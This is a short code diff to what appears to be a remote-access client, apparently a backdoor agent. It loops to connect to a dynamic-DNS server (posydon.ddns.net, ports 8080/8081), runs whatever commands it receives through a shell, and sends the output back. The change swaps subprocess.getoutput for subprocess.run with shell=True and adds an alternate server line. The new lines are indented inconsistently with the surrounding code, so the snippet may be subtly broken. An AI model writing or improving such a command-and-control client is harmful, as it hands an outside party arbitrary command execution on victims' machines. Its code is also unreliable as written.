@@ -12,6 +12,7 @@ import tempfile
 import os
 
 SERVER = "posydon.ddns.net"
+#SERVER = "ws.ifelse.io"
 PORT = 8080
 FILEPORT = 8081
 
@@ -130,8 +131,11 @@ while True: 		# Infinite loop to keep trying to connect
           module_thread.start()
           result = "Started module execution"
         else:
-          result = subprocess.getoutput(command)
-          print(result)
+            result_ = subprocess.run(command, shell=True, capture_output=True, text=True)
+            if result_.stdout == "":
+                result = result_.stderr
+            else:
+               result = result_.stdout
           
         data_to_send = {'type': 'response', 'data': result}
         print(json.dumps(data_to_send).encode())
